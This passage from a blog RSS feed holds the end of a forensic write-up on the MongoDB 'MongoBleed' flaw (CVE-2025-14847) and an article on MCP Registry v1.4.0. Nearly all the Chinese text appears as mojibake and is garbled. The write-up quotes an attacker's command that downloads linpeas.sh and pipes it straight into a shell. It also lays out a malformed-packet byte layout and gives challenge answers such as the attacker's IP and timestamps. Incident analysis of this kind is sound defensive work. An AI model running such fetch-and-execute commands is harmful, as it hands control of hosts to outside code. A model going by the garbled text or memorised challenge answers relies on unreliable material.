    // 2. åéç¼å²åºå¹¶æ·è´æ°æ®
    auto buffer = SharedBuffer::allocate(payload.size());
    std::copy(payload.begin(), payload.end(), buffer.get());

    // 3. è°ç¨æµè¯å½æ°ï¼ä¼ å¥å¼å¸¸æ¶æ¯ + Zlibåç¼©å¨å®ä¾
    checkUndersize(Message(buffer), std::make_unique&lt;ZlibMessageCompressor&gt;());
}
</code></pre>
<table>
<thead>
<tr>
<th>å­èèå´</th>
<th>å«ä¹</th>
<th>å¯¹åº payload å¼</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td>0-3</td>
<td>æ¶æ¯æ»é¿åº¦ï¼å°ç«¯åº uint32ï¼</td>
<td>0x3c 0x00 0x00 0x00</td>
<td>è§£æä¸ºåè¿å¶ 60 â å£°ææ¶æ¯æ»é¿åº¦æ¯ 60 å­è</td>
</tr>
<tr>
<td>4-7</td>
<td>é­æ° / æ è¯</td>
<td>0xad 0xde 0x00 0x00</td>
<td>MongoDB èªå®ä¹çåç¼©æ¶æ¯æ è¯ï¼0xADDE æ¯åºå®å¼ï¼</td>
</tr>
<tr>
<td>8-11</td>
<td>ä¿çå­æ®µ</td>
<td>0x00 0x00 0x00 0x00</td>
<td>æ å®éæä¹ï¼å ä½</td>
</tr>
<tr>
<td>12-15</td>
<td>åç¼©å¨ç±»åï¼å°ç«¯åº uint32ï¼</td>
<td>0xdc 0x07 0x00 0x00</td>
<td>è§£æä¸ºåè¿å¶ 2012 â æ è¯è¿æ¯ Zlib åç¼©çæ°æ®ï¼ä¸ååç¼©å¨æä¸å±æ°å¼ï¼</td>
</tr>
<tr>
<td>16-19</td>
<td>ä¿çå­æ®µ</td>
<td>0xdd 0x07 0x00 0x00</td>
<td>å ä½</td>
</tr>
<tr>
<td>20-23</td>
<td>åå§æ°æ®é¿åº¦ï¼å°ç«¯åº uint32ï¼</td>
<td>0x00 0x20 0x00 0x00</td>
<td>è§£æä¸ºåè¿å¶ 8192 â å£°æè§£åååå§æ°æ®é¿åº¦æ¯ 8192 å­è</td>
</tr>
<tr>
<td>24</td>
<td>åç¼©ç®æ³æ è¯</td>
<td>0x02</td>
<td>Zlib çç®æ³æ è¯ï¼Snappy æ¯ 0x01ï¼Zstd æ¯ 0x03ï¼</td>
</tr>
<tr>
<td>25+</td>
<td>Zlib åç¼©æ°æ®ä½</td>
<td>0x78 0xda ... 0x04 0x97</td>
<td>Zlib æ ¼å¼çåç¼©æ°æ®ï¼ä½è¢«æææé ä¸º âå°ºå¯¸ä¸è¶³âï¼</td>
</tr>
</tbody>
</table>
<ul>
<li>å¤´é¨å£°æ âåå§æ°æ®é¿åº¦æ¯ 8192 å­èâï¼ä½å®éç Zlib åç¼©æ°æ®ä½åªæ <code>60-25=35</code> å­è â è¿ä¸è¶³ä»¥è§£ååº 8192 å­èçåå§æ°æ®ï¼è§£åé»è¾ä¼æ£æµå° âæ°æ®å°ºå¯¸ä¸è¶³âã</li>
</ul>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115814-318572431.png" alt="image-20260102160356664" loading="lazy"></p>
<h3 id="æ¼æ´ä¿®å¤">æ¼æ´ä¿®å¤</h3>
<p>1.ç«å³åçº§å°<strong>å·²ä¿®å¤çæ¬</strong>ï¼</p>
<p>ç«å³åçº§å°ï¼</p>
<ul>
<li>8.2.3ã8.0.17ã7.0.28ã6.0.27ã5.0.32ã4.4.30</li>
<li>MongoDB Atlasï¼æç®¡çï¼å·²èªå¨ä¿®å¤ã</li>
</ul>
<p>2.<strong>ä¸´æ¶ç¼è§£</strong>ï¼<br>
ç¦ç¨ <code>zlib</code> åç¼©<br>
ï¼å¯å¨åæ°ï¼<code>--networkMessageCompressors=snappy,zstd</code> æéç½®æä»¶ä¸­æé¤ zlibï¼<br>
ä¸è¦å°27017ç«¯å£æ´é²å¨äºèç½<br>
æ°æ®åºè®¿é®è®¾ç½®ç½åå,ä¸è¦è®¾ç½®ä»»ä½ipå¯è®¿é®</p>
<h2 id="task2">Task2</h2>
<p>What is the version of MongoDB installed on the server that the CVE exploited?</p>
<p>åæä½äº<code>MangoBleed\uac-mongodbsync-linux-triage\[root]\var\log\mongodb\mongod.log</code></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116177-1760271411.png" alt="image-20260102161150999" loading="lazy"></p>
<p>8.0.16</p>
<h2 id="task3">Task3</h2>
<p>Analyze the MongoDB logs to identify the attackerâs remote IP address used to exploit the CVE.</p>
<p>å¨æ¥å¿ä¸­å³æ³¨äºä»¶ID22943(è¿æ¥)åID22944(æ­å¼è¿æ¥)</p>
<p>65.0.76.43</p>
<p>æä»¬ä¹å¯ä»¥ç¨å·¥å·è¿è¡åæ</p>
<p><a href="https://github.com/Neo23x0/mongobleed-detector" target="_blank" rel="noopener nofollow">https://github.com/Neo23x0/mongobleed-detector</a></p>
<pre><code class="language-kotlin"># Shell script dependencies
# Debian/Ubuntu
apt-get install jq gawk gzip

# RHEL/CentOS/Fedora
dnf install jq gawk gzip

# macOS
brew install jq gawk

# Python remote scanner has no additional dependencies
# Uses native ssh/scp commands


# Clone the repository
git clone https://github.com/your-org/mongobleed-detector.git
cd mongobleed-detector

# Make executable
chmod +x mongobleed-detector.sh
</code></pre>
<pre><code class="language-kotlin">./mongobleed-detector.sh --no-default-paths -p ./mongod.log -t 10000
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116518-329116859.png" alt="image-20260102164314888" loading="lazy"></p>
<h2 id="task4">Task4</h2>
<p>Based on the MongoDB logs, determine the exact date and time the attackerâs exploitation activity began (the earliest confirmed malicious event)</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116838-1010417894.png" alt="image-20260102164437061" loading="lazy"></p>
<p>æ ¹æ®ä¸å¾å¯ä»¥çå°</p>
<p>2025-12-29 05:25:52</p>
<h2 id="task5">Task5</h2>
<p>Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.</p>
<p>åæ ·å¨ä¸å¾</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117142-1389182106.png" alt="image-20260102165143240" loading="lazy"></p>
<ul>
<li><strong>Risk</strong>ï¼é£é©ç­çº§ï¼è¿éæ¯<code>HIGH</code>ï¼è¡¨ç¤ºé«é£é©ï¼</li>
<li><strong>SourceIP</strong>ï¼æ¥æº IP å°åï¼è¿éæ¯<code>65.0.76.43</code>ï¼</li>
<li><strong>ConnCount</strong>ï¼è¿æ¥æ¬¡æ°ï¼37630 æ¬¡ï¼ç­æ¶é´åå¤§éè¿æ¥ï¼</li>
<li><strong>MetaCount</strong>ï¼åæ°æ®æä½æ¬¡æ°ï¼0 æ¬¡ï¼</li>
<li><strong>DiscCount</strong>ï¼æ­å¼è¿æ¥æ¬¡æ°ï¼37630 æ¬¡ï¼åè¿æ¥æ°ä¸è´ï¼è¯´æè¿æ¥åç«å³æ­å¼ï¼</li>
<li><strong>MetaRate%</strong>ï¼åæ°æ®æä½å æ¯ï¼0.00%ï¼</li>
<li><strong>BurstRate/m</strong>ï¼æ¯åéçåè¿æ¥æ°ï¼30104 æ¬¡ï¼ç­æ¶é´åè¿æ¥é¢çæé«ï¼</li>
<li><strong>First/LastSeen</strong>ï¼é¦æ¬¡ / æåä¸æ¬¡åºç°çæ¶é´ï¼2025-12-29 ç 2 åéåå®æäºå¤§éè¿æ¥ï¼</li>
</ul>
<p>æä»¥æ»å±ä¸º75260</p>
<p>75260</p>
<h2 id="task6">Task6</h2>
<p>The attacker gained remote access after a series of bruteâforce attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?</p>
<p>è®¿é®/var/log/auth.logæ¥å¿</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117520-781480417.png" alt="image-20260102171320748" loading="lazy"></p>
<p>2025-12-29 05:40:03</p>
<h2 id="task7">Task7</h2>
<p>Identify the exact command line the attacker used to execute an inâmemory script as part of their privilegeâescalation attempt.</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117901-872419183.png" alt="image-20260102172751711" loading="lazy"></p>
<p>ç¡®å®ç¨æ·ä¸ºmongoadmin</p>
<p><code>uac-mongodbsync-linux-triage\[root]\home\mongoadmin</code>ä¸ç.bash_historyæä»¶ä¸­</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152118284-543519413.png" alt="image-20260102172905804" loading="lazy"></p>
<p><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></p>
<h2 id="task8">Task8</h2>
<p>The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152118612-1268812667.png" alt="image-20260102173145834" loading="lazy"></p>
<p>åæ ·å»åæä¸ä¸</p>
<p>/var/lib/mongodb</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152119029-1224398251.png" alt="image-20260102173140081" loading="lazy"></p>
<p>æç« åé´ï¼</p>
<p><a href="https://www.cnblogs.com/hzhsec/p/19428472" target="_blank">https://www.cnblogs.com/hzhsec/p/19428472</a></p>
<p><a href="https://www.gm7.org/archives/16179" target="_blank" rel="noopener nofollow">https://www.gm7.org/archives/16179</a></p>
<p><strong>åè´£å£°æ</strong></p>
<p>æ¬ææ¡£<code>MongoDBæ¼æ´å¤ç°ï¼CVE-2025-14847ï¼</code>æåå«çæ¼æ´å¤ç°æ¹æ³ãææ¯ç»èåå©ç¨ä»£ç ï¼<strong>ä»éç¨äºææçå®å¨æµè¯ãæè²å­¦ä¹ ä¸ç ç©¶ç®ç</strong>ã</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-03 15:22">2026-01-03 15:22</span>&nbsp;
<a href="https://www.cnblogs.com/DSchenzi">dynasty_chenzi</a>&nbsp;
éè¯»(<span id="post_view_count">94</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19434377);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19434377', targetLink: 'https://www.cnblogs.com/DSchenzi/p/19434377', title: 'æ·±åº¦åæMangoBleed(CVE-2025-14847)' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ MCP Registry v1.4.0 ææ°è¿å± ]]></title>
    <link>https://www.cnblogs.com/shanyou/p/19432926</link>
    <guid>97b6d446c9696a04fb09df60b73c321e</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/shanyou/p/19432926" title="åå¸äº 2026-01-02 22:34">
    <span role="heading" aria-level="2">MCP Registry v1.4.0 ææ°è¿å±</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><font face="å¾®è½¯éé» Light" size="3">2025 å¹´ 12 æ 16 æ¥åå¸ç Registry v1.4.0 çæ¬ ï¼ä¸ä»æ¯ææ¯è§æ ¼çä¸æ¬¡è¿­ä»£ï¼æ´æ¯æ´ä¸ªåè®®è¿åæççéè¦éç¨ç¢ãè¯¥çæ¬å¼å¥äºä¸¥æ ¼ç 2025-12-11 æ¨¡å¼å®ä¹ ï¼æ­£å¼ç¡®ç«äºå¯¹ streamable-http ä¼ è¾å±çåçæ¯æï¼å¹¶éæäºåå¸èéªè¯æµç¨ãä¸æ­¤åæ¶ï¼MCP çæ²»çç»æåçäºåå²æ§åé©ââAnthropic å°è¯¥åè®®æèµ ç» Linux åºéä¼æä¸æ°æç«ç Agentic AI åºéä¼ (AAIF)ãè¿ä¸ä¸¾æªææå°æ¶é¤äºä¼ä¸éç¨è¯¥åè®®çä¾åºåéå®é¡¾èï¼ä¿æäºåæ¬ AWSãGoogle CloudãCisco å Microsoft å¨åçè¡ä¸å·¨å¤´å¯¹è¯¥æ åçå¨é¢æ¥æ±ã</font></p><p><font face="å¾®è½¯éé» Light" size="3">è¦çè§£ v1.4.0 çæ¬çææ¯æä¹ï¼å¿é¡»é¦åå®¡è§ MCP æ¨å¨è§£å³çæ ¸å¿æ¶æææãå¨ MCP åºç°ä¹åï¼å° LLM è¿æ¥å°å¤é¨æ°æ®æºï¼å¦ PostgreSQL æ°æ®åºãGitHub ä»åºæ Notion ææ¡£ï¼éè¦éå¯¹æ¯ä¸ªæ¨¡åæä¾åç¼åå®å¶çéæä»£ç ã</font></p><p><font face="å¾®è½¯éé» Light" size="3">å¨å MCP æ¶ä»£ï¼å¼åèé¢ä¸´çæè°çâN x Mâéæå°å¢ãåè®¾æ N ä¸ªä¸»æµ AI æ¨¡åï¼å¦ Claude 3.5, GPT-4o, Gemini 1.5ï¼å M ä¸ªå¤é¨å·¥å·ææ°æ®æºãè¥è¦å®ç°äºæä½æ§ï¼çè®ºä¸éè¦ç»´æ¤ N * M ä¸ªç¬ç«çè¿æ¥å¨ãè¿ç§æ¶æä¸ä»èå¼±ï¼èä¸æé¾æ©å±ãä¸æ¦æ°æ®æºç API åçåæ´ï¼æèå¼åèå³å®åæ¢ AI æ¨¡åï¼ææçéæå·¥ä½é½éè¦æ¨åéæ¥ ã</font></p><p><font face="å¾®è½¯éé» Light" size="3">MCP éè¿å¼å¥æ ååçä¸­é´å±ï¼å°è¿ä¸å¤æåº¦éä½ä¸º N + Mã</font></p><ul><li><p><font face="å¾®è½¯éé» Light" size="3">æ ååæ¥å£ï¼ MCP å®ä¹äºä¸å¥éç¨ç JSON-RPC 2.0 æ¶æ¯æ ¼å¼ï¼ä½¿å¾ä»»ä½å¼å®¹ MCP çä¸»æºï¼Hostï¼é½å¯ä»¥ç´æ¥ä¸ä»»ä½ MCP æå¡å¨ï¼Serverï¼éä¿¡ï¼èæ éäºè§£åèçåºå±å®ç°ç»èã</font></p></li><li><p><font face="å¾®è½¯éé» Light" size="3"><font face="å¾®è½¯éé» Light" size="3">éç¨è¿æ¥å¨ï¼ è¿æå³çä¸ä¸ªéå¯¹ Google Drive å¼åç MCP æå¡å¨ï¼å¯ä»¥åæ¶è¢« Claude DesktopãCursor IDEãVS Code çè³å®å¶çä¼ä¸ AI ä»£çæä½¿ç¨ï¼çæ­£å®ç°äºâä¸æ¬¡ç¼åï¼å°å¤è¿è¡âçæ¿æ¯ã</font></font></p></li></ul><p><font face="å¾®è½¯éé» Light" size="3">éç v1.4.0 çåå¸ï¼MCP çç»ä»¶ä½ç³»å·²é«åº¦æçï¼å½¢æäºæ¸æ°çåå±æ¶æï¼</font></p><ol><li><p><font face="å¾®è½¯éé» Light" size="3">MCP Hostï¼ä¸»æºï¼ï¼<br>è¿æ¯ AI æ¨¡åçè¿è¡ç¯å¢ï¼ä¹æ¯éæçåèµ·ç«¯ãå¸åçä¸»æºåæ¬ Claude DesktopãCursorãWindsurf ä»¥ååç±»ä¼ä¸çº§ AI ç½å³ãä¸»æºè´è´£ç®¡çä¸ç¨æ·çäº¤äºä¸ä¸æï¼å¹¶å°ç¨æ·çèªç¶è¯­è¨æå¾è½¬åä¸ºå¯¹ MCP å·¥å·çè°ç¨è¯·æ± ã</font></p></li><li><p><font face="å¾®è½¯éé» Light" size="3">MCP Clientï¼å®¢æ·ç«¯ï¼ï¼<br>åµå¥å¨ä¸»æºåé¨çåè®®å®ç°å±ãå®è´è´£ä¸æå¡å¨å»ºç« 1:1 çè¿æ¥ï¼å¤çåè®®æ¡æãè½åååï¼Capabilities Negotiationï¼ä»¥åæ¶æ¯çåºååä¸ååºååãå¨ v1.4.0 çæä¸­ï¼å®¢æ·ç«¯æ¿æäºæ´å¤å®å¨èè´£ï¼å¦ OAuth 2.0 ä»¤çç®¡çåæéèå´ï¼Scopeï¼æ§å¶ ã</font></p></li><li><p><font face="å¾®è½¯éé» Light" size="3">MCP Serverï¼æå¡å¨ï¼ï¼<br>è¿æ¯çæç³»ç»çæ ¸å¿èµäº§ãæå¡å¨æ¯ä¸ä¸ªè½»éçº§çç½å³ç¨åºï¼å®å°è£äºç¹å®çæ°æ®æºæå·¥å·ï¼å¹¶éè¿ MCP åè®®æ´é²ç»å¤çãæå¡å¨å¯ä»¥æå¶ç®åï¼å¦ä¸ä¸ªåªè¯»ç SQLite æ¥è¯¢å¨ï¼ï¼ä¹å¯ä»¥æå¶å¤æï¼å¦ä¸ä¸ªå·ææ¨çè½åç GitHub è¿ç»´ä»£çï¼ãv1.4.0 çæ¬æå¤§å°å¢å¼ºäºæå¡å¨çåæ°æ®å®ä¹è½åï¼ä½¿å¶è½å¤æ´ç²¾åå°åæ³¨åè¡¨æè¿°èªèº«è¡ä¸ºã</font></p></li><li><p><font face="å¾®è½¯éé» Light" size="3">Transport Layerï¼ä¼ è¾å±ï¼ï¼<br>éä¿¡çç®¡éã</font></p></li></ol><ul><ul><li><p><font face="å¾®è½¯éé» Light" size="3">Stdioï¼æ åè¾å¥è¾åºï¼ï¼ å¨ MCP æ©æä¸»è¦ç¨äºæ¬å°å¼åï¼éè¿è¿ç¨é´éä¿¡ï¼IPCï¼å®ç°æå¶ä½å»¶è¿çäº¤äºï¼ä¸å¤©ç¶éç¦»ç½ç»é£é©ã</font></p></li><li><p><font face="å¾®è½¯éé» Light" size="3">SSE (Server-Sent Events) over HTTP: éç v1.4.0 å¯¹è¿ç¨è¿æ¥æ¯æçå®åï¼åºäº HTTP ç SSE ä¼ è¾å·²æä¸ºä¸»æµãå®åè®¸æå¡å¨ç¬ç«é¨ç½²å¨äºç«¯ï¼å¦ Docker å®¹å¨æ Serverless å½æ°ä¸­ï¼ï¼å¹¶éè¿æ å URL è¢«è¿ç¨å®¢æ·ç«¯è®¿é®ãè¿ç§æ¨¡å¼æ¯ä¼ä¸çº§âè¿ç¨ MCPâé¨ç½²çåºç³ã</font></p></li></ul></ul><p><font face="å¾®è½¯éé» Light" size="3">&nbsp;&nbsp;&nbsp;&nbsp; 2025 å¹´ 12 æ 16 æ¥ï¼modelcontextprotocol/registry ä»åºåå¸äº v1.4.0 çæ¬ãè¿ä¸çæ¬ä¸ä»ä»æ¯ä»£ç çæ´æ°ï¼æ´æ¯å¯¹æ´ä¸ªæ³¨åè¡¨æå¡ï¼Registry Serviceï¼æ°æ®æ¨¡åçä¸æ¬¡éæï¼æ¨å¨éåºæ¥çå¤æçåå¸å¼çæç³»ç»ã</font></p><p><br></p><p><font face="å¾®è½¯éé» Light" size="3">v1.4.0 æå·ç ´åæ§ä½ä¹æå·å»ºè®¾æ§çåæ´æ¯å¼ºå¶éç¨äºæ°ç server.json æ¨¡å¼å®ä¹ï¼çæ¬å·ä¸º 2025-12-11ãserver.json æä»¶æ¯ MCP æå¡å¨å¨æ³¨åè¡¨ä¸­çâèº«ä»½è¯âï¼å®å®ä¹äºæå¡å¨çåç§°ãæè¿°ãå®è£æ¹å¼åçæ¬ä¿¡æ¯ã</font></p><p><font face="å¾®è½¯éé» Light" size="3">å¨æ­¤ä¹åççæ¬ï¼å¦ 2025-10-17ï¼ä¸­ï¼æ¨¡å¼å®ä¹ç¸å¯¹å®½æ¾ï¼åè®¸è®¸å¤éæ åå­æ®µå­å¨ï¼ä¸å¯¹è¿ç¨è¿æ¥çå®ä¹ä¸å¤ä¸¥è°¨ãæ°çæ¨¡å¼å¸¦æ¥äºä»¥ä¸å³é®æ¹è¿ï¼</font></p><h6><font face="å¾®è½¯éé» Light" size="3" style="font-weight: normal">1 ãä¸¥æ ¼çä¼ è¾å±å®ä¹ï¼<font face="å¾®è½¯éé» Light" size="3">æ°æ¨¡å¼æ¾å¼å°æ ååäº remotes å­æ®µä¸­ streamable-http çéç½®æ¹å¼ã<font face="å¾®è½¯éé» Light" size="3">å¨æ§çæ¬ä¸­ï¼è¿ç¨æå¡å¨çéç½®å¾å¾ä¾èµäºç¹å®å®¢æ·ç«¯ççº¦å®ä¿æãèå¨ v1.4.0 ä¸­ï¼server.json å¿é¡»ä¸¥æ ¼éµå¾ªä»¥ä¸ç»ææ¥å£°æè¿ç¨è½å ã<font face="å¾®è½¯éé» Light" size="3">è¿ç§ä¸¥æ ¼çç±»åå®ä¹ï¼Type Safetyï¼ç¡®ä¿äºæ è®ºæ¯ VS Code è¿æ¯ Claude Desktopï¼å¨è§£æè¿ç¨æå¡å¨æ¶é½è½åç¡®è¯å«è¿æ¥æ¹å¼åè®¤è¯éæ±ï¼æ¶é¤äºå éç½®æ¨¡ç³å¯¼è´çè¿æ¥å¤±è´¥ã</font></font></font></font></h6><h6><font face="å¾®è½¯éé» Light" size="3" style="font-weight: normal">2 ãç§»é¤ status å­æ®µä¸å¨æå¥åº·æ£æ¥ï¼<font face="å¾®è½¯éé» Light" size="3">v1.4.0 ç§»é¤äº server.json ä¸­ç status å­æ®µ ãæ­¤åï¼å¼åèéè¦æå¨å¨ JSON æä»¶ä¸­æ è®°æå¡å¨ç¶æï¼å¦ "beta", "stable"ï¼ãè¿ç§éææ è®°å¾å¾ä¸å®éè¿è¡ç¶æè±èã<font face="å¾®è½¯éé» Light" size="3">æ°çæ¬çè®¾è®¡çå¿µæ¯ï¼å¥åº·ç¶æåºå½æ¯å¨æçæµçç»æï¼èééæå£°æã æ³¨åè¡¨æå¡ç°å¨éè¿åç½®çéªè¯é»è¾ï¼Validation Logicï¼å®æè½®è¯¢æå¡å¨ï¼æ ¹æ®å®éååºæåµå³å®å¶å¨ç´¢å¼ä¸­çå¯è§æ§ãè¿æ¾èæé«äºæ³¨åè¡¨æ°æ®çå¯ä¿¡åº¦ï¼é²æ­¢ç¨æ·å®è£å·²åæçâåµå°¸æå¡å¨âã</font></font></font></h6><h6><font face="å¾®è½¯éé» Light" size="3" style="font-weight: normal">3ã çæ¬ä¸è´æ§å¼ºå¶ï¼<font face="å¾®è½¯éé» Light" size="3">æ°æ¨¡å¼å¼å¥äºä¸¥æ ¼ççæ¬ä¸è´æ§æ£æ¥ãserver.json ä¸­ç version å­æ®µç°å¨å¿é¡»ä¸ Git Tag æåç®¡çå¨ï¼NPM/PyPIï¼ä¸­ççæ¬å·ä¸¥æ ¼å¹é ãå¦ææ³¨åè¡¨æ£æµå°çæ¬å·ä¸ä¸è´ï¼ä¾å¦ server.json å£°æäº v2.0.0 ä½ Git Tag åªæ v1.9.0ï¼ï¼åå¸æµç¨å°èªå¨å¤±è´¥ãè¿ä¸æºå¶ææå°æç»äºâå¹½çµçæ¬âé®é¢ï¼ç¡®ä¿ç¨æ·æåçä»£ç ä¸æ³¨åè¡¨æè¿°å®å¨ä¸è´ã</font></font></h6><p><font face="å¾®è½¯éé» Light" size="3">ä¼´éæ³¨åè¡¨æ´æ°ï¼å®æ¹åå¸å·¥å· mcp-publisher ä¹åæ­¥åçº§è³ v1.4.0 17ãè¯¥ CLI å·¥å·æ¯å¼åèä¸ MCP æ³¨åè¡¨äº¤äºçä¸»è¦æ¥å£ã</font> </p><p><font face="å¾®è½¯éé» Light" size="3">v1.4.0 çæ¬çåå¸å¨æ·±åº¦éæäº OpenID Connect (OIDC) åè®®ï¼ç¹å«æ¯éå¯¹ GitHub Actions çç¯å¢ãè¿æå³çå¼åèä¸åéè¦çæåç»´æ¤é¿æç API å¯é¥ï¼Long-lived Secretsï¼æ¥åå¸æ´æ°ã</font></p><p><font face="å¾®è½¯éé» Light" size="3">éè¿éç½® GitHub Action Workflowï¼mcp-publisher å¯ä»¥å©ç¨ä¸´æ¶ç OIDC ä»¤çåæ³¨åè¡¨è¯æèº«ä»½ãæ³¨åè¡¨æå¡ç«¯ä¼éªè¯è¯¥ä»¤çæ¯å¦ç±åæ³ç GitHub ä»åºç­¾åï¼ä»èææåå¸ãè¿æå¤§å°æåäºä¾åºé¾çå®å¨æ§ï¼å ä¸ºå³ä¾¿åå¸èæ¬æ³é²ï¼æ»å»èä¹æ æ³å¨å¤é¨ç¯å¢ä¼ªé ææç OIDC ä»¤ç ã</font></p><h6><font face="å¾®è½¯éé» Light" size="3">æ°çå·¥å·å¼å¥äºæ´å¼ºå¤§ç check å init å½ä»¤ã</font></h6><ul><li><p><font face="å¾®è½¯éé» Light" size="3">mcp-publisher initï¼è½å¤æºè½åæå½åç®å½ç»æï¼è¯å«æ¯ Node.js é¡¹ç®è¿æ¯ Python é¡¹ç®ï¼ï¼èªå¨çæç¬¦å 2025-12-11 æ åç server.json æ¨¡æ¿ã</font></p></li><li><p><font face="å¾®è½¯éé» Light" size="3">mcp-publisher checkï¼æéæå¨åå¸æµç¨ä¸­çéªè¯ï¼ï¼å¨ä¸ä¼ åå¯¹ JSON æä»¶è¿è¡æ¬å° Schema æ ¡éªãè¿è§£å³äºä»¥å¾æäº¤åæåç°æ ¼å¼éè¯¯å¯¼è´åå¸å¤±è´¥ççç¹ï¼ç¼©ç­äºåé¦å¾ªç¯</font> ã</p></li></ul><p><font face="å¾®è½¯éé» Light" size="3"><br></font></p><p><font face="å¾®è½¯éé» Light" size="3">å¦æè¯´ Registry v1.4.0 æ¯ææ¯çåçº§ï¼é£ä¹ Agentic AI åºéä¼ (AAIF) çæç«åæ¯ MCP èµ°åè¡ä¸æ åçæ¿æ²»å®£è¨ã2025 å¹´ 12 æ 9 æ¥ï¼Anthropic æ­£å¼å®£å¸å° MCP é¡¹ç®åå¶ç¸å³èµäº§æèµ ç» Linux åºéä¼æä¸æ°æç«ç AAIFã</font></p><p><font face="å¾®è½¯éé» Light" size="3">å¨ 2024 å¹´è³ 2025 å¹´é´ï¼AI é¢åè¢«è§ä¸ºåå¤§å·¨å¤´ï¼OpenAI, Google, Anthropic, Metaï¼äºå¤ºçæä¸»å¯¼æçæåºãå¦æ MCP å§ç»ç± Anthropic ä¸å®¶å¬å¸æ§å¶ï¼å¶ä»ç«äºå¯¹æï¼å°¤å¶æ¯ OpenAI å Googleï¼å°å¾é¾æ¯«æ ä¿çå°éçº³è¿ä¸æ åï¼å ä¸ºè¿æ¶åå°çæéå®çé£é©ã</font></p><p><font face="å¾®è½¯éé» Light" size="3"><font face="å¾®è½¯éé» Light" size="3">éè¿å° MCP ç§»äº¤ç» Linux åºéä¼è¿ä¸ä¸­ç«æºæï¼Anthropic æä»¿äº Google æèµ  Kubernetes ç» CNCF çæåè·¯å¾ãè¿ä¸ä¸¾æªäº§çäºç«ç«¿è§å½±çææï¼</font></font></p><ul><li><p><font face="å¾®è½¯éé» Light" size="3">æ¶é¤ä¿¡ä»»éç¢ï¼ AWS å Google Cloud éå³å®£å¸å å¼ºå¯¹ MCP çæ¯æï¼å ä¸ºæ åä¸åå±äºæä¸ªåä¸ç«äºå¯¹æã</font></p></li><li><p><font face="å¾®è½¯éé» Light" size="3">ç»ä¸æçº¿ï¼ OpenAI ä¸ä»å å¥äºåºéä¼ï¼è¿æèµ äºå¶ AGENTS.md æ åãè¿æå³çè¡ä¸æ­£å¨èµ°åèåââOpenAI çä»£çå®ä¹è§èä¸ MCP çå·¥å·è¿æ¥è§èå°å¨ AAIF çæ¡æ¶ä¸è¿è¡æ´åï¼å½¢æä¸å¥å®æ´çâä»£çææ¯æ âã</font></p></li></ul><p><font face="å¾®è½¯éé» Light" size="3"><br></font></p><p><font face="å¾®è½¯éé» Light" size="3"><br></font></p>
</div>
<div id="MySignature" role="contentinfo">
    <p>æ¬¢è¿å¤§å®¶æ«æä¸é¢äºç»´ç æä¸ºæçå®¢æ·ï¼æ¶ä½ ä¸äº</p>
<img src="https://images.cnblogs.com/cnblogs_com/shanyou/57459/o_220125090408_%E9%82%80%E8%AF%B7%E4%BA%8C%E7%BB%B4%E7%A0%81-258px.jpeg" width="170">
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.0006944444444444445" data-date-updated="2026-01-02 22:35">2026-01-02 22:34</span>&nbsp;
<a href="https://www.cnblogs.com/shanyou">å¼ åå</a>&nbsp;
éè¯»(<span id="post_view_count">310</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19432926);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19432926', targetLink: 'https://www.cnblogs.com/shanyou/p/19432926', title: 'MCP Registry v1.4.0 ææ°è¿å±' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>